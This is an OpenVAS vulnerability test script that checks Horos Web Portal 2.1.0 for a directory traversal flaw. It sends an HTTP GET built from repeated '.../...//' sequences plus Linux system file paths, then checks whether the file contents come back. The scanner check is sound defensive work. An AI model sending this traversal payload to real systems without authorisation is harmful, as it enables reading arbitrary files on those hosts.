###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_horos_dir_trav.nasl 12338 2018-11-13 14:51:17Z asteins $
#
# Horos Web Portal Directory Traversal Vulnerability
#
# Authors:
# Tameem Eissa <tameem.eissa@greenbone.net>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:horos:horos";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107115");
  script_version("$Revision: 12338 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-11-13 15:51:17 +0100 (Tue, 13 Nov 2018) $");
  script_tag(name:"creation_date", value:"2016-12-28 13:26:09 +0700 (Wed, 28 Dec 2016)");
  script_tag(name:"qod_type", value:"remote_app");
  script_name("Horos Web Portal Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Horos Web Portal and is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read a specific file or not.");

  script_tag(name:"insight", value:"Horos suffers from a file disclosure vulnerability when input passed through the
  URL path is not properly verified before being used to read files.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers
  to read arbitrary files.");

  script_tag(name:"affected", value:"Horos Web Portal version 2.1.0");

  script_tag(name:"solution", value:"Apply the latest updated supplied by the vendor.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5387.php");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_horos_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("horos/installed");
  script_require_ports("Services/www", 3333);
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

files = traversal_files("linux");

if( dir == "/" ) dir = "";

foreach file (keys(files))
{
  url = dir + "/" + crap( data:".../...//", length:10*9) + files[file];

  if(http_vuln_check(port:http_port, url:url, check_header:TRUE, pattern:file)) {
    report = report_vuln_url(port:http_port, url:url);
    security_message(port:http_port, data:report);
    exit(0);
  }
}

exit(99);
